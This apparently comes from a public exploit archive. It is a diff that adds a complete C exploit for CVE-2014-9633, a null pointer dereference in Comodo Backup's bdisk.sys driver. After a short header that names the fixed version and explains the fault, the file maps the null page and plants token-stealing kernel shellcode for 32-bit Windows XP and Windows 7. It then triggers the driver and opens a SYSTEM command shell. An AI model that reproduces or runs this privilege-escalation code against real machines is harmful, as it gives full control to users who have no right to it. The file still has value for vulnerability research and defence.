@@ -1,0 +1,270 @@
+/*
+
+Exploit Title    - Comodo Backup Null Pointer Dereference Privilege Escalation
+Date             - 23rd January 2015
+Discovered by    - Parvez Anwar (@parvezghh)
+Vendor Homepage  - https://www.comodo.com
+Tested Version   - 4.4.0.0
+Driver Version   - 1.0.0.957 - bdisk.sys
+Tested on OS     - 32bit Windows XP SP3 and Windows 7 SP1
+OSVDB            - http://www.osvdb.org/show/osvdb/112828
+CVE ID           - CVE-2014-9633
+Vendor fix url   - http://forums.comodo.com/news-announcements-feedback-cb/comodo-backup-44123-released-t107293.0.html
+Fixed version    - 4.4.1.23 
+Fixed Driver Ver - 1.0.0.972
+
+
+
+Note
+----
+Does not cleanly exit, had to use some leave instructions to get the command
+prompt. If you know of a better way please do let me know.
+
+Below in from Windows XP in IofCallDriver function.
+
+eax = 12h
+
+804e37fe 8b7108          mov     esi,dword ptr [ecx+8]  <- control the null page as ecx = 00000000
+804e3801 52              push    edx
+804e3802 51              push    ecx
+804e3803 ff548638        call    dword ptr [esi+eax*4+38h] ds:0023:00000080=00000090
+804e3807 5e              pop     esi
+804e3808 c3              ret
+
+
+esi + eax*4 + 38h = 0 + 48 + 38 = 80h if ESI is null
+
+
+*/
+
+
+#include <stdio.h>
+#include <windows.h>
+
+#define BUFSIZE 4096
+
+
+typedef NTSTATUS (WINAPI *_NtAllocateVirtualMemory)(
+     IN HANDLE ProcessHandle,
+     IN OUT PVOID *BaseAddress,
+     IN ULONG ZeroBits,
+     IN OUT PULONG RegionSize,
+     IN ULONG AllocationType,
+     IN ULONG Protect);
+
+
+// Windows XP SP3
+
+#define XP_KPROCESS 0x44      // Offset to _KPROCESS from a _ETHREAD struct
+#define XP_TOKEN    0xc8      // Offset to TOKEN from the _EPROCESS struct
+#define XP_UPID     0x84      // Offset to UniqueProcessId FROM the _EPROCESS struct
+#define XP_APLINKS  0x88      // Offset to ActiveProcessLinks _EPROCESS struct
+
+// Windows 7 SP1
+
+#define W7_KPROCESS 0x50      // Offset to _KPROCESS from a _ETHREAD struct
+#define W7_TOKEN    0xf8      // Offset to TOKEN from the _EPROCESS struct
+#define W7_UPID     0xb4      // Offset to UniqueProcessId FROM the _EPROCESS struct
+#define W7_APLINKS  0xb8      // Offset to ActiveProcessLinks _EPROCESS struct
+
+
+
+BYTE token_steal_xp[] =
+{
+  0x52,					                   // push edx                       Save edx on the stack
+  0x53,					                   // push ebx                       Save ebx on the stack
+  0x33,0xc0,				                   // xor eax, eax                   eax = 0
+  0x64,0x8b,0x80,0x24,0x01,0x00,0x00,		           // mov eax, fs:[eax+124h]         Retrieve ETHREAD
+  0x8b,0x40,XP_KPROCESS,                                   // mov eax, [eax+XP_KPROCESS]     Retrieve _KPROCESS
+  0x8b,0xc8,				                   // mov ecx, eax
+  0x8b,0x98,XP_TOKEN,0x00,0x00,0x00,		           // mov ebx, [eax+XP_TOKEN]        Retrieves TOKEN
+  0x8b,0x80,XP_APLINKS,0x00,0x00,0x00,		           // mov eax, [eax+XP_APLINKS] <-|  Retrieve FLINK from ActiveProcessLinks
+  0x81,0xe8,XP_APLINKS,0x00,0x00,0x00,		           // sub eax, XP_APLINKS         |  Retrieve _EPROCESS Pointer from the ActiveProcessLinks
+  0x81,0xb8,XP_UPID,0x00,0x00,0x00,0x04,0x00,0x00,0x00,    // cmp [eax+XP_UPID], 4        |  Compares UniqueProcessId with 4 (System Process)
+  0x75,0xe8,				                   // jne                     ---- 
+  0x8b,0x90,XP_TOKEN,0x00,0x00,0x00,		           // mov edx, [eax+XP_TOKEN]        Retrieves TOKEN and stores on EDX
+  0x8b,0xc1,          			                   // mov eax, ecx                   Retrieves KPROCESS stored on ECX
+  0x89,0x90,XP_TOKEN,0x00,0x00,0x00,		           // mov [eax+XP_TOKEN], edx        Overwrites the TOKEN for the current KPROCESS
+  0x5b,   				                   // pop ebx                        Restores ebx
+  0x5a,                                                    // pop edx                        Restores edx
+  0xc9,                                                    // leave
+  0xc9,                                                    // leave
+  0xc9,                                                    // leave
+  0xc9,                                                    // leave
+  0xc3 	                                                   // ret 
+};
+
+
+
+BYTE token_steal_w7[] =
+{
+  0x52,					                   // push edx                       Save edx on the stack
+  0x53,					                   // push ebx                       Save ebx on the stack
+  0x33,0xc0,				                   // xor eax, eax                   eax = 0
+  0x64,0x8b,0x80,0x24,0x01,0x00,0x00,		           // mov eax, fs:[eax+124h]         Retrieve ETHREAD
+  0x8b,0x40,W7_KPROCESS,                                   // mov eax, [eax+W7_KPROCESS]     Retrieve _KPROCESS
+  0x8b,0xc8,				                   // mov ecx, eax
+  0x8b,0x98,W7_TOKEN,0x00,0x00,0x00,		           // mov ebx, [eax+W7_TOKEN]        Retrieves TOKEN
+  0x8b,0x80,W7_APLINKS,0x00,0x00,0x00,		           // mov eax, [eax+W7_APLINKS] <-|  Retrieve FLINK from ActiveProcessLinks
+  0x81,0xe8,W7_APLINKS,0x00,0x00,0x00,		           // sub eax, W7_APLINKS         |  Retrieve _EPROCESS Pointer from the ActiveProcessLinks
+  0x81,0xb8,W7_UPID,0x00,0x00,0x00,0x04,0x00,0x00,0x00,    // cmp [eax+W7_UPID], 4        |  Compares UniqueProcessId with 4 (System Process)
+  0x75,0xe8,				                   // jne                     ---- 
+  0x8b,0x90,W7_TOKEN,0x00,0x00,0x00,		           // mov edx, [eax+W7_TOKEN]        Retrieves TOKEN and stores on EDX
+  0x8b,0xc1,          			                   // mov eax, ecx                   Retrieves KPROCESS stored on ECX
+  0x89,0x90,W7_TOKEN,0x00,0x00,0x00,		           // mov [eax+W7_TOKEN], edx        Overwrites the TOKEN for the current KPROCESS
+  0x5b,   				                   // pop ebx                        Restores ebx
+  0x5a,                                                    // pop edx                        Restores edx
+  0xc9,                                                    // leave
+  0xc9,                                                    // leave
+  0xc9,                                                    // leave
+  0xc9,                                                    // leave
+  0xc3  	                                           // ret 
+};
+
+
+
+BYTE ESInull[] = "\x00\x00\x00\x00";        
+
+BYTE RETaddr[] = "\x90\x00\x00\x00";        
+
+
+
+int GetWindowsVersion()
+{
+    int v = 0;
+    DWORD version = 0, minVersion = 0, majVersion = 0;
+
+    version = GetVersion();
+
+    minVersion = (DWORD)(HIBYTE(LOWORD(version)));
+    majVersion = (DWORD)(LOBYTE(LOWORD(version)));
+
+    if (minVersion == 1 && majVersion == 5) v = 1;  // "Windows XP;
+    if (minVersion == 1 && majVersion == 6) v = 2;  // "Windows 7";
+
+    return v;
+}
+
+
+void spawnShell()
+{
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+
+
+    ZeroMemory(&pi, sizeof(pi));
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+
+    si.cb          = sizeof(si); 
+    si.dwFlags     = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOWNORMAL;
+
+    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
+    {
+       printf("\n[-] CreateProcess failed (%d)\n\n", GetLastError());
+       return;
+    }
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+}
+
+
+
+int main(int argc, char *argv[]) 
+{
+
+    _NtAllocateVirtualMemory    NtAllocateVirtualMemory;
+    NTSTATUS                    allocstatus;
+    LPVOID                      base_addr = (LPVOID)0x00000001;                     
+    DWORD                       written;
+    int                         rwresult;
+    int                         size = BUFSIZE; 
+    HANDLE                      hDevice;
+    unsigned char               buffer[BUFSIZE];    
+    unsigned char               devhandle[MAX_PATH]; 
+
+
+    printf("-------------------------------------------------------------------------------\n");
+    printf("      COMODO Backup (bdisk.sys) Null Pointer Dereference EoP Exploit           \n");
+    printf("            Tested on Windows XP SP3/Windows 7 SP1 (32bit)                     \n");
+    printf("-------------------------------------------------------------------------------\n\n");
+
+
+    sprintf(devhandle, "\\\\.\\%s", "bdisk");
+
+    NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtAllocateVirtualMemory");
+ 	
+    if (!NtAllocateVirtualMemory)
+    {
+        printf("[-] Unable to resolve NtAllocateVirtualMemory\n");
+        return -1;  
+    }
+
+    printf("[+] NtAllocateVirtualMemory [0x%p]\n", NtAllocateVirtualMemory);
+    printf("[+] Allocating memory at [0x%p]\n", base_addr);
+	 
+    allocstatus = NtAllocateVirtualMemory(INVALID_HANDLE_VALUE, &base_addr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    if (allocstatus) 
+    {
+        printf("[-] An error occured while mapping executable memory. Status = 0x%08x\n", allocstatus);
+        printf("Error : %d\n", GetLastError());
+        return -1;
+    }
+    printf("[+] NtAllocateVirtualMemory successful\n");
+
+    memset(buffer, 0x90, BUFSIZE);
+    memcpy(buffer+0x00000007, ESInull, sizeof(ESInull)-1);
+    memcpy(buffer+0x0000007f, RETaddr, sizeof(RETaddr)-1);
+
+    if (GetWindowsVersion() == 1) 
+    {
+        printf("[i] Running Windows XP\n");
+        memcpy(buffer+0x00000100, token_steal_xp, sizeof(token_steal_xp));
+        printf("[i] Size of shellcode %d bytes\n", sizeof(token_steal_xp));
+    }
+    else if (GetWindowsVersion() == 2) 
+    {
+        printf("[i] Running Windows 7\n");
+        memcpy(buffer+0x00000100, token_steal_w7, sizeof(token_steal_w7));
+        printf("[i] Size of shellcode %d bytes\n", sizeof(token_steal_w7));
+    }
+    else if (GetWindowsVersion() == 0) 
+    {
+        printf("[i] Exploit not supported on this OS\n\n");
+        return -1;
+    }  
+
+    rwresult = WriteProcessMemory(INVALID_HANDLE_VALUE, (LPVOID)0x00000001, buffer, BUFSIZE, &written);
+
+    if (rwresult == 0)
+    {
+        printf("[-] An error occured while mapping writing memory: %d\n", GetLastError());
+        return -1;
+    }
+    printf("[+] WriteProcessMemory %d bytes written\n", written);  
+    
+    printf("[~] Press any key to Exploit . . .\n");
+    getch();
+	
+    hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
+    
+    if (hDevice == INVALID_HANDLE_VALUE)
+    {
+        printf("[-] CreateFile open %s device failed (%d)\n\n", devhandle, GetLastError());
+        return -1;
+    }
+    else 
+    {
+        printf("[+] Open %s device successful\n", devhandle);
+    }
+
+    CloseHandle(hDevice);
+
+    printf("[+] Spawning SYSTEM Shell\n");
+    spawnShell();
+
+    return 0;
+}
